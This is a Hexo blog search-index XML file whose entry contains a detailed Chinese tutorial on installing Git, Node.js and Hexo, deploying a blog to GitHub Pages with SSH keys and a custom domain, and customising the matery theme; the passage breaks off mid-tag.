<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>blog</title>
      <link href="/2021/12/29/blog/"/>
      <url>/2021/12/29/blog/</url>
      
        <content type="html"><![CDATA[<h1 id="阅读须知"><a href="#阅读须知" class="headerlink" title="阅读须知"></a>阅读须知</h1><hr><blockquote><p>注意，这篇文章篇幅较长，主要针对新手，每一步很详细，所以可能会显得比较啰嗦，所以建议基础比较好小伙伴根据目录选择自己感兴趣的部分跳着看，不要文章没看，上来先喷一下！谢谢⊙o⊙⊙o⊙。<br>教程内容随意复制使用，引用的话请加一个参考链接，谢谢！</p></blockquote><h1 id="博客开源"><a href="#博客开源" class="headerlink" title="博客开源"></a>博客开源</h1><hr><p>倒腾了一两周总算把个人博客网站完善了，目前这个版本使用应该是够了，当然还有一些优化项和功能增加后续在慢慢更新，为了回馈开源，今天准备把我自己修改完善的<code>blog</code>网站源代码开源。这不是生成后的网页文件，是您可以直接使用的源码，您只需要把博客相关信息换成您自己的就可以部署了，对于新手或者不懂编程的小伙伴来说，简直是福音，极大简化了您构建博客的工作量和复杂度，每个人都可以下载并修改成自己喜欢样式！如果你有修改想法，欢迎PR！最后，我们还是给这个开源小项目取个名字吧，就叫<a href="https://github.com/shw2018/hexo-blog-fly.git">hexo-blog-fly</a>吧，怎么样？&lt;&lt;&lt;&lt;&lt;<a href="https://github.com/shw2018/hexo-blog-fly">源代码下载</a>&gt;&gt;&gt;&gt;&gt;</p><p>本博客基于<code>Hexo</code>框架搭建，用到<a href="https://github.com/shw2018/hexo-theme-matery">hexo-theme-matery</a>主题,并在此基础之上做了很多修改，修复了一些bug，增加了一些新的特性和功能，博客地址：<a href="https://shw2018.github.io/">https://shw2018.github.io</a>，博客演示：<a href="https://shw2018.github.io/">sunhwee.com</a>。</p><p><strong>简单使用方法：</strong></p><ol><li><code>star</code> 本项目仓库^o^</li><li>安装<a href="https://git-scm.com/downloads">Git</a>, 安装<a href="https://nodejs.org/en/">nodeJS</a></li><li>你可以直接<code>fork</code>一份源码到你的仓库，<code>clone</code>到本地</li><li>在本地博客仓库运行<code>npm i</code>命令安装依赖包</li><li>修改配置信息，改成自己的信息</li><li>运行命令<code>hexo clean</code>（清除生成文件），<code>hexo g</code>（生成网页）， <code>hexo s</code>（本地预览），<code>hexo d</code>（部署）</li></ol><blockquote><p><strong>更多详情教程，强烈推荐看我写的：<a href="https://sunhwee.com/posts/6e8839eb.html">Hexo+Github博客搭建完全教程</a></strong></p></blockquote><p>有什么问题可以在文章最后评论区<strong>留言和讨论</strong>，当然，欢迎点击文章最后的打赏按键，请博主一杯冰阔乐，笑～</p><blockquote><p><strong>最后，如果项目和教程对你有所帮助或者你看见了还算比较喜欢，欢迎给我<code>star</code>，谢谢您！</strong></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>去年在博客园注册了自己的第一个博客，当时初衷就是想拿来作为自己的在线笔记本，做做学习记录，分享一些学到的东西，使用第三方提供的博客服务其实也挺方便，现在市面上提供类似服务的博客网站也很多，如CSDN，博客园，简书等平台，可以直接在上面发表，用户交互做的好，写的文章百度也能搜索的到。但是缺点是比较不自由，会受到平台的各种限制和恶心的广告，个性化不足。而自己购买域名和服务器，搭建博客的成本实在是太高了，不光是说这些购买成本，单单是花力气去自己搭这么一个网站，还要定期的维护它，对于我们大多数人来说，也是没有这样的精力和时间。那么，我们能不能自己定制一个自己喜欢的个性化博客，同时也不用付出太高的成本啦？</p><p>这就引出了第三种选择，基于开源框架搭建博客，然后直接在<code>github page</code>平台上托管我们的博客。这样就可以安心的来写作，又不需要定期维护，基于这个想法，今年8月初的时候开始搭建第一个属于自己的独立博客，前后断续弄了近一周，到现在稍微有点模样了。我想可能有很多小伙伴应该也想过搭建一个自己的博客，当然，网上也有一堆详细教程。写这篇博客的目的大概有两个，第一个是当做自己的搭建记录，方便以后自己随时查看提示修改，第二个是稍稍总结一下具体的搭建步骤以及一些支持个性化定制的博客源码修改的教程，稍稍分享一下这些修改经验，当然，更多的一些个性化操作需要你自己以后在这个基础上慢慢去摸索，有些写的不太好的地方还希望看到的小伙伴多多包涵。</p><p>博客初步的页面效果可以看一下我的博客：<a href="http://shw2018.github.io/">sunhwee.com</a>，欢迎大家支持。</p><p>本博客基于<a href="https://hexo.io/zh-cn/">Hexo</a>，所以首先要了解一下我们搭建博客所要用到的框架。<code>Hexo</code>是高效的静态网站生成框架，它基于<code>Node.js</code>，快速，简单且功能强大，是搭建博客的首选框架。大家可以进入<a href="https://hexo.io/zh-cn/">hexo</a>官网进行详细查看，因为<code>Hexo</code>的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。通过<code>Hexo</code>，你可以直接使用<code>Markdown</code>语法来撰写博客。相信很多小伙伴写工程都写过<code>README.md</code>文件吧，对，就是这个格式的！写完后只需两三条命令即可将生成的网页上传到<code>github</code>或者<code>coding</code>等代码管理托管平台，然后别人就可以浏览你的博客网页啦。是不是很简单？你无需关心网页源代码的具体生成细节，只需要用心写好你的博客文章内容就行了。</p><blockquote><p>简单总结：<code>Hexo</code>, 产品成熟，使用简单，功能强大，有丰富的各种插件资源；但，像发布后台、站内搜索，评论系统类似诉求，虽然有对应的工具，但也需要自己折腾下，后续我们一步一步介绍。</p></blockquote><p>教程大致分三个部分，</p><ul><li>第一部分：<code>hexo</code>的初级搭建还有部署到<code>github page</code>上，以及个人域名的绑定。</li><li>第二部分：<code>hexo</code>的基本配置，更换主题，实现多终端工作，以及在<code>coding page</code>部署实现国内外分流</li><li>第三部分：<code>hexo</code>添加各种功能，包括搜索的<code>SEO</code>，阅读量统计，访问量统计和评论系统等。</li></ul><h1 id="第一部分-搭建"><a href="#第一部分-搭建" class="headerlink" title="第一部分 搭建"></a>第一部分 搭建</h1><hr><p><code>hexo</code>的初级搭建还有部署到<code>github page</code>上，以及个人域名的绑定。</p><h2 id="Hexo搭建步骤"><a href="#Hexo搭建步骤" class="headerlink" title="Hexo搭建步骤"></a>Hexo搭建步骤</h2><ul><li>1.安装<code>Git</code></li><li>2.安装<code>Node.js</code></li><li>3.安装<code>Hexo</code></li><li>4.<code>GitHub</code>创建个人仓库</li><li>5.生成<code>SSH</code>添加到<code>GitHub</code></li><li>6.将<code>hexo</code>部署到<code>GitHub</code></li><li>7.设置个人域名</li><li>8.发布文章</li></ul><h2 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h2><hr><p>为了把本地的网页文件上传到<code>github</code>上面去，需要用到工具———Git[<a href="https://git-scm.com/download">下载地址]</a>。<code>Git</code>是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。<code>Git</code>非常强大，建议每个人都去了解一下。廖雪峰老师的<code>Git</code>教程写的非常好，大家可以看一下。<a href="https://www.liaoxuefeng.com/wiki/896043488029600">Git教程</a></p><p><strong>windows：</strong>到<code>git</code>官网上下载<code>.exe</code>文件,<a href="https://git-scm.com/download/win">Download git</a>,安装选项还是全部默认，只不过最后一步添加路径时选择<code>Use Git from the Windows Command Prompt</code>，这样我们就可以直接在命令提示符里打开<code>git</code>了。</p><blockquote><p>顺便说一下，<code>windows</code>在<code>git</code>安装完后，就可以直接使用<code>git bash</code>来敲命令行了，不用自带的<code>cmd</code>，<code>cmd</code>有点难用。</p></blockquote><p><strong>linux：</strong>对<code>linux</code>来说实在是太简单了，因为最早的<code>git</code>就是在<code>linux</code>上编写的，只需要一行代码</p><pre><code>sudo apt-get install git</code></pre><p>Bash</p><p>安装完成后在命令提示符中输入<code>git --version</code>来查看一下版本验证是否安装成功。</p><h2 id="2-安装nodejs"><a href="#2-安装nodejs" class="headerlink" title="2. 安装nodejs"></a>2. 安装nodejs</h2><hr><p><code>Hexo</code>是基于<code>node.js</code>编写的，所以需要安装一下<code>node.js</code>和里面的<code>npm</code>工具。</p><p><strong>windows：</strong>下载稳定版或者最新版都可以<a href="http://nodejs.cn/download/">Node.js</a>，安装选项全部默认，一路点击<code>Next</code>。<br>最后安装好之后，按<code>Win+R</code>打开命令提示符，输入<code>node -v</code>和<code>npm -v</code>，如果出现版本号，那么就安装成功了。</p><p><strong>linux：</strong>命令行安装：</p><pre><code>sudo apt-get install nodejssudo apt-get install npm</code></pre><p>Bash</p><p>不过不推荐命令行安装，有时候有问题，建议直接到官网去下载编译好的压缩文件，如下所示:</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/1.png" alt="img"></p><p>然后解压到你指定的文件夹即可，比如我解压到我系统的<code>/home/shw/MySoftwares</code>目录下了，如图:</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/2.png" alt="img"></p><blockquote><p>注意本压缩包是<code>.tar.xz</code>格式的，需要两次解压</p></blockquote><p>配置一下环境变量</p><pre><code>sudo vim /etc/profile</code></pre><p>Bash</p><p>复制下面两行到刚打开的<code>profile</code>文件最底部(注意<code>node</code>的安装地址<code>/home/shw/MySoftwares/node-v12.8.0-linux-x64</code>换成自己的)：</p><pre><code>export NODE_HOME=/home/shw/MySoftwares/node-v12.8.0-linux-x64export PATH=$PATH:$NODE_HOME/bin</code></pre><p>Bash</p><p>保存后退出，再执行下面命令将环境变量生效：</p><pre><code>source /etc/profile</code></pre><p>Bash</p><p>将目录软链接到全局环境下（命令后面的<code>/usr/local/bin/node</code>是固定的）</p><pre><code>sudo ln -s /home/shw/MySoftwares/node-v12.8.0-linux-x64/node /usr/local/bin/nodesudo ln -s /home/shw/MySoftwares/node-v12.8.0-linux-x64/npm /usr/local/bin/npm</code></pre><p>Bash</p><p>这样安装好了以后使用<code>npm</code>安装的包(比如：<code>ionic serve</code>)，使用包的命令时可能会提示找不到命令，没关系，在用户目录下终端执行下面命令固定写法固定写法：</p><pre><code>echo -e &quot;export PATH=$(npm prefix -g)/bin:$PATH&quot; &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc</code></pre><p>Bash</p><p>这样我们在所有用户下，都可以使用<code>npm</code>，也可以使用<code>npm</code>安装的包的命令。成功的将<code>nodejs</code>安装并配置到全局环境下。</p><p>安装完后，打开命令行终端，输入:</p><pre><code>node -vnpm -v</code></pre><p>Bash</p><p>检查一下有没有安装成功</p><h2 id="添加国内镜像源"><a href="#添加国内镜像源" class="headerlink" title="添加国内镜像源"></a><strong>添加国内镜像源</strong></h2><p>如果没有梯子的话，可以使用阿里的国内镜像进行加速。</p><pre><code>npm config set registry https://registry.npm.taobao.org</code></pre><p>Bash</p><h2 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3. 安装Hexo"></a>3. 安装Hexo</h2><hr><p>前面<code>git</code>和<code>nodejs</code>安装好后，就可以安装<code>hexo</code>了，你可以先创建一个文件夹<code>MyBlog</code>，用来存放自己的博客文件，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接右键<code>git bash</code>打开）。</p><p>比如我的博客文件都存放在<code>D:\Study\MyBlog</code>目录下。</p><p>在该目录下右键点击<code>Git Bash Here</code>，打开<code>git</code>的控制台窗口，以后我们所有的操作都在<code>git</code>控制台进行，就不用<code>Windows</code>自带的<code>cmd</code>了。</p><p>定位到该目录下，输入<code>npm install -g hexo-cli</code>安装<code>Hexo</code>。可能会有几个报错，无视它就行。</p><pre><code>npm install -g hexo-cli</code></pre><p>Bash</p><p>安装完后输入<code>hexo -v</code>验证是否安装成功。</p><p>至此<code>hexo</code>就安装完了。</p><p>接下来初始化一下<code>hexo</code>,即初始化我们的网站，输入<code>hexo init</code>初始化文件夹</p><pre><code>hexo init MyBlog</code></pre><p>Bash</p><p>这个<code>MyBlog</code>可以自己取什么名字都行，然后，接着输入<code>npm install</code>安装必备的组件。</p><pre><code>cd MyBlog      //进入这个MyBlog文件夹npm install</code></pre><p>Bash</p><p>新建完成后，指定文件夹<code>MyBlog</code>目录下有：</p><ul><li><code>node_modules:</code> 依赖包</li><li><code>public：</code>存放生成的页面</li><li><code>scaffolds：</code>生成文章的一些模板</li><li><code>source：</code>用来存放你的文章</li><li><code>themes：</code>主题**</li><li><code>_config.yml:</code> 博客的配置文件**</li></ul><p>这样本地的网站配置也弄好啦，输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>打开本地服务器，</p><pre><code>hexo ghexo server(或者简写:hexo s）)</code></pre><p>Bash</p><p>然后浏览器打开<a href="http://localhost:4000/%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%88%91%E4%BB%AC%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%95%A6%EF%BC%8C%E6%95%88%E6%9E%9C%E5%A6%82%E4%B8%8B%EF%BC%9A">http://localhost:4000/，就可以看到我们的博客啦，效果如下：</a></p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/3.png" alt="img"></p><p>按<code>ctrl+c</code>关闭本地服务器。</p><h2 id="4-注册Github账号创建个人仓库"><a href="#4-注册Github账号创建个人仓库" class="headerlink" title="4. 注册Github账号创建个人仓库"></a>4. 注册Github账号创建个人仓库</h2><hr><p>接下来就去注册一个<code>github</code>账号，用来存放我们的网站。大多数小伙伴应该都有了吧，作为一个合格的程序猿（媛）还是要有一个的。</p><p>打开<a href="https://github.com/%EF%BC%8C%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%BB%93%E5%BA%93%60New">https://github.com/，新建一个项目仓库`New</a> repository`，如下所示：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/4.png" alt="img"></p><p>然后如下图所示，输入自己的项目名字，后面一定要加<code>.github.io</code>后缀，<code>README</code>初始化也要勾上。</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/5.png" alt="img"></p><blockquote><p>要创建一个和你用户名相同的仓库，后面加.[<a href="http://github.io，只有这样，将来要部署到`GitHub](http://github.xn--io%2C%2C`github-682v24rcn0bge3bnmb63gnr5n8eybxf3aidf/)">http://github.io，只有这样，将来要部署到`GitHub](http://github.xn--io%2C%2C`github-682v24rcn0bge3bnmb63gnr5n8eybxf3aidf/)</a> page<code>的时候，才会被识别，也就是http://xxxx.github.io，其中xxx就是你注册</code>GitHub`的用户名。例如我的：<a href="http://shw2018.github.io/">http://shw2018.github.io</a></p></blockquote><h2 id="5-生成SSH添加到GitHub"><a href="#5-生成SSH添加到GitHub" class="headerlink" title="5. 生成SSH添加到GitHub"></a>5. 生成SSH添加到GitHub</h2><hr><p>生成<code>SSH</code>添加到<code>GitHub</code>，连接<code>Github</code>与本地。<br>右键打开<code>git bash</code>，然后输入下面命令：</p><pre><code>git config --global user.name &quot;yourname&quot;git config --global user.email &quot;youremail&quot;</code></pre><p>Bash</p><p>这里的<code>yourname</code>输入你的<code>GitHub</code>用户名，<code>youremail</code>输入你<code>GitHub</code>的邮箱。这样<code>GitHub</code>才能知道你是不是对应它的账户。例如我的：</p><pre><code>git config --global user.name &quot;shw2018&quot;git config --global user.email &quot;hwsun@std.uestc.edu.cn&quot;</code></pre><p>Bash</p><p>可以用以下两条，检查一下你有没有输对</p><pre><code>git config user.namegit config user.email</code></pre><p>Bash</p><p>然后创建<code>SSH</code>,一路回车</p><blockquote><p><code>ssh</code>，简单来讲，就是一个秘钥，其中，<code>id_rsa</code>是你这台电脑的私人秘钥，不能给别人看的，<code>id_rsa.pub</code>是公共秘钥，可以随便给别人看。把这个公钥放在<code>GitHub</code>上，这样当你链接<code>GitHub</code>自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过<code>git</code>上传你的文件到<code>GitHub</code>上。</p></blockquote><pre><code>ssh-keygen -t rsa -C &quot;youremail&quot;</code></pre><p>Bash</p><p>这个时候它会告诉你已经生成了<code>.ssh</code>的文件夹。在你的电脑中找到这个文件夹。或者<code>git bash</code>中输入</p><pre><code>cat ~/.ssh/id_rsa.pub</code></pre><p>Bash</p><p>将输出的内容复制到框中，点击确定保存。</p><p>打开<a href="http://github.com/">github</a>，在头像下面点击<code>settings</code>，再点击<code>SSH and GPG keys</code>，新建一个<code>SSH</code>，名字随便取一个都可以，把你的<code>id_rsa.pub</code>里面的信息复制进去。如图：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/6.png" alt="img"></p><p>在<code>git bash</code>输入<code>ssh -T git@github.com</code>，如果如下图所示，出现你的用户名，那就成功了。</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/7.png" alt="img"></p><h2 id="6-将hexo部署到GitHub"><a href="#6-将hexo部署到GitHub" class="headerlink" title="6. 将hexo部署到GitHub"></a>6. 将hexo部署到GitHub</h2><hr><p>这一步，我们就可以将<code>hexo</code>和<code>GitHub</code>关联起来，也就是将<code>hexo</code>生成的文章部署到<code>GitHub</code>上，打开博客根目录下的<code>_config.yml</code>文件，这是博客的配置文件，在这里你可以修改与博客配置相关的各种信息。</p><p>修改最后一行的配置：</p><pre><code>deploy:  type: git  repository: https://github.com/shw2018/shw2018.github.io  branch: master</code></pre><p>Yml</p><p><code>repository</code>修改为你自己的<code>github</code>项目地址即可，就是部署时，告诉工具，将生成网页通过<code>git</code>方式上传到你对应的链接仓库中。</p><p>这个时候需要先安装<code>deploy-git</code> ，也就是部署的命令,这样你才能用命令部署到<code>GitHub</code>。</p><pre><code>npm install hexo-deployer-git --save</code></pre><p>Bash</p><p>然后</p><pre><code>hexo cleanhexo generatehexo deploy</code></pre><p>Bash</p><p>其中 <code>hexo clean</code>清除了你之前生成的东西，也可以不加。 <code>hexo generate</code>顾名思义，生成静态文章，可以用 <code>hexo g</code>缩写 ，<code>hexo deploy</code>部署文章，可以用<code>hexo d</code>缩写</p><blockquote><p>注意<code>deploy</code>时可能要你输入<code>username</code>和<code>password</code>。</p></blockquote><p>得到下图就说明部署成功了，过一会儿就可以在<a href="http://yourname.github.io/">http://yourname.github.io</a> 这个网站看到你的博客了！！</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/8.png" alt="img"></p><h2 id="7-设置个人域名"><a href="#7-设置个人域名" class="headerlink" title="7. 设置个人域名"></a>7. 设置个人域名</h2><hr><p>现在你的个人网站的地址是<code>yourname.github.io</code>，如果觉得这个网址逼格不太够，这就需要你设置个人域名了。但是需要花钱。</p><blockquote><p><strong>不过，这一步不是必要的，如果目前还不想买域名可以先跳过，继续看后面的，以后想买域名了在还看这块</strong></p></blockquote><p>首先你得购买一个专属域名，<code>xx</code>云都能买，看你个人喜好了。</p><p>这篇以腾讯云为例，腾讯云官网购买：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/9.png" alt="img"></p><p>然后实名认证后进入腾讯云控制台，点云解析进去，找到你刚买的域名，点进去添加两条解析记录，如下图所示：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/10.png" alt="img"></p><p>然后打开你的<code>github</code>博客项目，点击<code>settings</code>，拉到下面<code>Custom domain</code>处，填上你自己的域名，保存：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/11.png" alt="img"></p><p>这时候你的项目根目录应该会出现一个名为<code>CNAME</code>的文件了。如果没有的话，打开你本地博客<code>/source</code>目录，我的是<code>D:\Study\MyBlog\source</code>，新建<code>CNAME</code>文件，注意没有后缀。然后在里面写上你的域名，保存。最后运行<code>hexo g</code>、<code>hexo d</code>上传到<code>github</code>。</p><p>过不了多久，再打开你的浏览器，输入你自己的专属域名，就可以看到搭建的网站啦！</p><h2 id="8-写文章、发布文章"><a href="#8-写文章、发布文章" class="headerlink" title="8. 写文章、发布文章"></a>8. 写文章、发布文章</h2><hr><p>首先在博客根目录下右键打开<code>git bash</code>，安装一个扩展<code>npm i hexo-deployer-git</code>。</p><p>然后输入<code>hexo new post &quot;article title&quot;</code>，新建一篇文章。</p><p>然后打开<code>D:\Study\MyBlog\source\_posts</code>的目录，可以发现下面多了一个文件夹和一个<code>.md</code>文件，一个用来存放你的图片等数据，另一个就是你的文章文件啦。<br>你可以会直接在<code>vscode</code>里面编写<code>markdown</code>文件，可以实时预览，也可以用用其他编辑<code>md</code>文件的软件的工具编写。<br>编写完markdown文件后，根目录下输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>可以本地预览效果，最后输入<code>hexo d</code>上传到<code>github</code>上。这时打开你的<code>github.io</code>主页就能看到发布的文章啦。</p><p>到这儿基本第一部分就完成了，已经完整搭建起一个比较简陋的个人博客了，接下来我们就可以对我们的博客进行个性化定制了。</p><h1 id="第二部分-定制"><a href="#第二部分-定制" class="headerlink" title="第二部分 定制"></a>第二部分 定制</h1><hr><p>我们要定制自己的博客的话，首先就要来了解一下<code>Hexo</code>博客的一些目录和文件的作用，以及如何平滑更换漂亮的主题模板并加入自己的定制源代码实现个性化定制</p><h2 id="1-Hexo相关目录文件"><a href="#1-Hexo相关目录文件" class="headerlink" title="1. Hexo相关目录文件"></a>1. Hexo相关目录文件</h2><h3 id="1-1-博客目录构成介绍"><a href="#1-1-博客目录构成介绍" class="headerlink" title="1.1 博客目录构成介绍"></a>1.1 博客目录构成介绍</h3><hr><p>从上图可以看出，博客的目录结构如下：</p><pre><code>- node_modules- public- scaffolds- source    - _data    - _posts    - about    - archives    - categories    - friends    - tags- themes</code></pre><p>Json</p><p><code>node_modules</code>是<code>node.js</code>各种库的目录，<code>public</code>是生成的网页文件目录，<code>scaffolds</code>里面就三个文件，存储着新文章和新页面的初始设置，<code>source</code>是我们最常用到的一个目录，里面存放着文章、各类页面、图像等文件，<code>themes</code>存放着主题文件，一般也用不到。</p><p>我们平时写文章只需要关注<code>source/_posts</code>这个文件夹就行了。</p><h3 id="1-2-hexo基本配置"><a href="#1-2-hexo基本配置" class="headerlink" title="1.2 hexo基本配置"></a>1.2 hexo基本配置</h3><hr><p>在文件根目录下的<code>_config.yml</code>，就是整个<code>hexo</code>框架的配置文件了。可以在里面修改大部分的配置。详细可参考官方的<a href="https://hexo.io/zh-cn/docs/configuration">配置描述</a>。</p><h4 id="1-2-1-网站"><a href="#1-2-1-网站" class="headerlink" title="1.2.1 网站"></a>1.2.1 网站</h4><hr><p>参数描述<code>title</code>网站标题<code>subtitle</code>网站副标题<code>description</code>网站描述<code>author</code>您的名字<code>language</code>网站使用的语言<code>timezone</code>网站时区。<code>Hexo</code> 默认使用您电脑的时区。时区列表。比如说：<code>America/New_York, Japan</code>, 和 <code>UTC</code> 。</p><p>其中，<code>description</code>主要用于<code>SEO</code>，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。<code>author</code>参数用于主题显示文章的作者。</p><h4 id="1-2-2-网址"><a href="#1-2-2-网址" class="headerlink" title="1.2.2 网址"></a>1.2.2 网址</h4><hr><p>参数描述<code>url</code>网址<code>root</code>网站根目录 <code>permalink</code>文章的<a href="https://hexo.io/zh-cn/docs/permalinks">永久链接</a>格式<code>permalink_defaults</code>永久链接中各部分的默认值</p><p>在这里，你需要把<code>url</code>改成你的<strong>网站域名</strong>。</p><p><code>permalink</code>，也就是你生成某个文章时的那个链接格式。</p><p>比如我新建一个文章叫<code>temp.md</code>，那么这个时候他自动生成的地址就是<code>http://yoursite.com/2018/09/05/temp</code>。</p><p>以下是官方给出的示例，关于链接的变量还有很多，需要的可以去官网上查找 <a href="https://hexo.io/zh-cn/docs/permalinks">永久链接</a> 。</p><blockquote><p>参数结果:year/:month/:day/:title/2019/08/10/hello-world :year-:month-:day-:title.html 2019-08-10-hello-world.html :category/:titlefoo/bar/hello-world</p></blockquote><p>再往下翻，中间这些都默认就好了。</p><pre><code>theme: landscap</code></pre><p>Yml</p><p><code>theme</code>就是选择什么主题，也就是在<code>themes</code>这个文件夹下，在官网上有很多个主题，默认给你安装的是<code>lanscape</code>这个主题。当你需要更换主题时，在官网上下载，把主题的文件放在<code>themes</code>文件夹下，再修改这个主题参数就可以了。</p><h4 id="1-2-3-Front-matter"><a href="#1-2-3-Front-matter" class="headerlink" title="1.2.3 Front-matter"></a>1.2.3 Front-matter</h4><hr><p><code>Front-matter</code> 是<code>md</code>文件最上方以 <code>---</code>分隔的区域，用于指定个别文件的变量，举例来说：</p><pre><code>title: Hexo+Github博客搭建记录date: 2019-08-10 21:44:44</code></pre><p>下是预先定义的参数，您可在模板中使用这些参数值并加以利用。</p><p>参数描述<code>layout</code>布局<code>title</code>标题<code>date</code>建立日期<code>updated</code>更新日期<code>comments</code>开启文章的评论功能<code>tags</code>标签（不适用于分页）<code>categories</code>分类（不适用于分页）<code>permalink</code>覆盖文章网址</p><p>其中，分类和标签需要区别一下，分类具有顺序性和层次性，也就是说<code>Foo</code>，<code>Bar</code>不等于<code>Bar</code>，<code>Foo</code>；而标签没有顺序和层次。</p><pre><code>---title: Hexo+Github博客搭建记录date: 2019-08-10 21:44:44author: 洪卫img: /medias/banner/7.jpgcoverImg: /medias/banner/7.jpgtop: truecover: truetoc: truepassword: 5f15b28ffe43f8be4f239bdd9b69af9d80dbafcb20a5f0df5d1677a120ae9110mathjax: truesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要tags:- Hexo- Github- 博客categories:- 软件安装与配置---</code></pre><p>Yml</p><h4 id="1-2-4-layout（布局）"><a href="#1-2-4-layout（布局）" class="headerlink" title="1.2.4 layout（布局）"></a>1.2.4 layout（布局）</h4><hr><p><strong>1.2.4.1 post</strong></p><p>当你每一次使用代码</p><pre><code>hexo new XXX</code></pre><p>Bash</p><p>它其实默认使用的是<code>post</code>这个布局，也就是在<code>source</code>文件夹下的<code>_post</code>里面。</p><p><code>Hexo</code>有三种默认布局：<code>post</code>、<code>page</code>和<code>draft</code>，它们分别对应不同的路径，而您自定义的其他布局和<code>post</code>相同，都将储存到<code>source/_posts</code>文件夹。</p><p>而new这个命令其实是：</p><pre><code>hexo new [layout] &lt;title&gt;</code></pre><p>Bash</p><p>只不过这个<code>layout</code>默认是<code>post</code>罢了。</p><p><strong>1.2.4.2 page</strong></p><p>如果你想另起一页，那么可以使用</p><pre><code>hexo new page newpage</code></pre><p>Bash</p><p>系统会自动给你在<code>source</code>文件夹下创建一个<code>newpage</code>文件夹，以及<code>newpage</code>文件夹中的<code>index.md</code>，这样你访问的<code>newpage</code>对应的链接就是<a href="http://xxx.xxx/newpage">http://xxx.xxx/newpage</a></p><p><strong>1.2.4.3 draft</strong></p><p><code>draft</code>是草稿的意思，也就是你如果想写文章，又不希望被看到，那么可以</p><pre><code>hexo new draft newdraft</code></pre><p>Bash</p><p>这样会在<code>source/_draft</code>中新建一个<code>newdraft.md</code>文件，如果你的草稿文件写的过程中，想要预览一下，那么可以使用</p><pre><code>hexo server --draft</code></pre><p>Bash</p><p>在本地端口中开启服务预览。</p><p>如果你的草稿文件写完了，想要发表到<code>post</code>中，</p><pre><code>hexo publish draft newdraft</code></pre><p>Bash</p><p>就会自动把<code>newdraft.md</code>发送到<code>post</code>中。</p><h2 id="2-更换主题"><a href="#2-更换主题" class="headerlink" title="2. 更换主题"></a>2. 更换主题</h2><hr><p>我们在了解<code>Hexo</code>博客文件基础之后，知道主题文件就放在<code>themes</code>文件下，那么我们就可以去Hexo官网下载喜欢的主题，复制进去然后修改参数即可。<br>网上大多数主题都是github排名第一的<code>Next</code>主题，但是我个人不是很喜欢，我在网上看到一个主题感觉还不错：<a href="https://github.com/blinkfox/hexo-theme-matery">hexo-theme-matery</a>，地址在<a href="https://github.com/blinkfox/hexo-theme-matery">传送门</a>。这个主题看着比较漂亮，并且响应式比较友好，点起来很舒服，功能也比较很多。</p><blockquote><p>当然，人各有异，这个主题风格也不一定是你喜欢，那么你也可以跟着这教程类似的方法替换成你喜欢的就行了。</p></blockquote><blockquote><p>特性：</p></blockquote><ul><li>简单漂亮，文章内容美观易读</li><li><a href="https://material.io/">Material Design</a> 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 <code>MathJax</code></li><li><code>TOC</code> 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li><a href="https://gitalk.github.io/">Gitalk</a>、<a href="https://imsun.github.io/gitment/">Gitment</a>、<a href="https://valine.js.org/">Valine</a> 和 <a href="https://disqus.com/">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li><li>集成了<a href="http://busuanzi.ibruce.info/">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li></ul><p>他的介绍文档写得非常的详细，还有中英文两个版本。效果图如下：</p><p><img src="https://raw.githubusercontent.com/shw2018/cdn/master/blog_files/img/Hexo-Blog-Tutorial/12.png" alt="img"></p><p>首先先按照文档教程安装一遍主题，然后是可以正常打开的，如果你是一般使用的话，基本没啥问题了。不过有些地方有些地方可以根据你自己的习惯和喜好修改一下， 下面记录一下我这个博客修改了的一些地方。</p><h3 id="2-1-新建文章模板修改"><a href="#2-1-新建文章模板修改" 